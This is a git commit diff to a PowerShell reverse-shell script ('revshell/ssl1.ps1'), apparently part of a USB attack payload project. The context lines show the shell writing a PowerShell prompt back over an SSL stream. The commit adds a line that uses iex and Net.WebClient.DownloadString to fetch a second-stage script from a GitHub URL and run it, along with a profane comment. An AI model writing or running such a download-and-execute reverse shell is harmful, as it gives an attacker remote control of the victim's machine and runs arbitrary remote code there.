b765c4ec148c0ad08f7fd26d59bf90297a1b733c
josh-fraser <53281424+josh-fraser@users.noreply.github.com>
2022-06-18 21:32:57 +1000

    Update ssl1.ps1

--- revshell/ssl1.ps1
+++ revshell/ssl1.ps1
@@ -6,3 +6,6 @@ $d = new-object System.IO.StreamWriter($c)
 $d.Write('PS ' + (pwd).Path + '> ')
 $d.flush()
 [byte[]]$e = 0..65535|%{0};
+
+#if this works i will fucking cry
+iex (New-Object Net.WebClient).DownloadString('https://github.com/josh-fraser/usbrd/raw/main/revshell/ssl2.ps1')
